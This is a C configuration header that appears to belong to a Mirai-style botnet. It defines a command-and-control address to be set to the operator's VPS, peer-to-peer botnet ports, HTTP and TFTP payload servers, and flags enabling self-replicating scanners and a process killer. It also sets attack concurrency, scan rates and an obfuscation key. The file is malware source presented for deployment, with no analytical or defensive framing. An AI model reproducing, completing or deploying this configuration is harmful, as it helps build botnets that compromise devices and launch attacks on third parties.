#ifndef _CONFIG_H
#define _CONFIG_H

/* CNC server (change to your VPS IP) */
#define CNC_ADDR "0.0.0.0"

/* P2P configuration - torrent-style networking */
#define P2P_PORT 49152
#define P2P_FILE_PORT 49153
#define P2P_MAX_PEERS 256
#define P2P_PING_INTERVAL 30
#define P2P_PEER_TIMEOUT 120
#define P2P_SEEDS ""

/* Scan callback port */
#define SCAN_CB_PORT 9555

/* Server configuration */
#define HTTP_SERVER "0.0.0.0"
#define HTTP_SERVER_IP "0.0.0.0"
#define HTTP_PORT 80
#define TFTP_SERVER "0.0.0.0"
#define SINGLE_INSTANCE_PORT 23455

/* Feature flags */
#define KILLER
#define SELFREP          /* Enable self-replication scanners */
//#define WATCHDOG

/* Performance tuning */
#define ATTACK_CONCURRENT_MAX 15
#define SCAN_RAW_PPS 384
#define SCANNER_MAX_CONNS 256
#define KILLER_MIN_PID 400
#define KILLER_RESTART_SCAN_TIME 3600
#define TABLE_KEY 0xdeadbeef

#endif
